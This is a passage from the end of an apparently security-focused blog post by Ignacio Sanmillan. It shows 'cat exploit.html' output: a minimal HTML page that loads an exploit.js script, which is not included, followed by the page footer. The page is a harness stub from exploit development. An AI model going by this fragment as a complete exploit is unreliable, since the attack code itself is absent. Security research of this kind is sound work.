<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>$cat exploit.html
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;exploit.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;</span></span></code></pre></div></p>

      </div></div>

  

  
    

  
</article>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright copyright--user">
        <span>Ignacio Sanmillan</span>
    
      </div>
  </div>
</footer>






<script type="text/javascript" src="/bundle.min.js"></script>





  
</div>

</body>
</html>
